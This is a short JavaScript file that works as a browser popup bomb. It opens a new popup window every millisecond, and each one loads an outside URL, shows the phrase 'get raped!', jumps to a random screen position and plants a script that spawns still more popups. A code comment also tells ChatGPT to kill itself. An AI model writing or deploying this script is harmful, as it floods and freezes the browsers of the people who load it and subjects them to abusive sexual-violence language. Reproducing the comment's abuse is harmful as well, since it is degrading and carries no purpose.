const message = "get raped!";
const windows = [];
const targetURL = "https://bhoppings.de/rape"; // Replace with the appropriate URL if needed - kill yourself chatgpt

function createMovingWindow() {
    const newWindow = window.open(targetURL, "", "width=200,height=100");
    if (newWindow) {
        newWindow.document.write(`<p style="font-size:20px;color:red;text-align:center;">${message}</p>`);
        newWindow.document.title = message;

        newWindow.document.write(`
            <script>
                function createMovingWindow() {
                    const newWindow = window.open("${targetURL}", "", "width=200,height=100");
                    if (newWindow) {
                        newWindow.document.write(\`<p style="font-size:20px;color:red;text-align:center;">${message}</p>\`);
                        newWindow.document.title = "${message}";
                        newWindow.moveTo(Math.random() * screen.width, Math.random() * screen.height);
                        newWindow.focus();
                    }
                }

                setInterval(createMovingWindow, 30);
            <\/script>
        `);

        newWindow.moveTo(Math.random() * screen.width, Math.random() * screen.height);
        newWindow.focus();
        windows.push(newWindow);
    }
}

setInterval(() => {
    createMovingWindow();
}, 1);

window.addEventListener('beforeunload', () => {
    // Do not close the windows, just remove them from the array
    windows.length = 0;
});
